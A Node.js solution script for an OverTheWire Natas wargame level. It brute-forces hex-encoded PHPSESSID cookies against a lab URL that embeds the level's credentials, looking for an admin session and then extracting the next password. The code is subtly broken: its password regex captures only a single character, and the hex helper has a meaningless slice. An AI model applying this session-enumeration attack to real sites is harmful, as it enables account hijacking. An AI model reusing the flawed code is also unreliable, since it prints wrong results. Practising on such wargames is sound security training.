import fetch from 'node-fetch';

let uri = `http://natas18:xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP@natas18.natas.labs.overthewire.org/index.php?debug=true&username=admin&password=foo`;

const maxid = 1000;

async function start() {
  for (var i = -1; i <= maxid; i++) {
    console.log("Testing: " + i);
    const body = await runRequest(i);
    if (body.match(/next level/i)) {
      console.log("Found admin session: " + i);
      const password = body.match(/Password:\s([^<])+/)[1];
      console.log(`Password: ${password}`);
      break;
    }
  }
}

function toHex(str) {
  var hex, i;

  var result = "";
  for (i=0; i<str.length; i++) {
    hex = str.charCodeAt(i).toString(16);
    result += (hex).slice(-4);
  }
  return result
}

async function runRequest(sessionId) {
  let foo = `${sessionId}`;
  let sessidValue = `PHPSESSID=${toHex(foo)}`;
  console.log(`${foo} : ${toHex(foo)}`);
  const headers = {
    Cookie: sessidValue
  };
  console.log('Trying uri: '+uri +' with cookie '+sessidValue);
  const response = await fetch(uri, {headers})
      .then((response) => response.text());

  console.log('body', response);
  return response;
}

start();
